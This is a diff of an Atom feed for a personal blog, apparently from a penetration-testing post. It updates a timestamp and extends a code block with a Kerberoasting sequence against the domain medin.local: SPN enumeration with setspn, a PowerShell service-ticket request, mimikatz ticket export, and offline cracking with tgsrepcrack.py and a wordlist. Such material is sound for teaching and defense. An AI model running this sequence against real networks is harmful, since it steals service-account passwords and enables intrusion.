@@ -4,7 +4,7 @@
   <title><![CDATA[KC's blog]]></title>
   <link href="http://zomo.heroku.com/atom.xml" rel="self"/>
   <link href="http://zomo.heroku.com/"/>
-  <updated>2017-02-21T10:10:32+09:00</updated>
+  <updated>2017-02-24T09:25:01+09:00</updated>
   <id>http://zomo.heroku.com/</id>
   <author>
     <name><![CDATA[KC]]></name>
@@ -23,9 +23,17 @@
 <figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
 <span class='line-number'>2</span>
 <span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
 </pre></td><td class='code'><pre><code class=''><span class='line'>PS&gt; setspn -T medin.local -F -Q */*
 </span><span class='line'>PS&gt; Add-Type -AssemblyName System.IdentityModel
-</span><span class='line'>PS&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"</span></code></pre></td></tr></table></div></figure>
+</span><span class='line'>PS&gt; New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/web01.medin.local"
+</span><span class='line'>
+</span><span class='line'>mimikatz # kerberos::list /export
+</span><span class='line'>
+</span><span class='line'>$ tgsrepcrack.py wordlist.txt *.kirbi</span></code></pre></td></tr></table></div></figure>
 
 ]]></content>
   </entry>
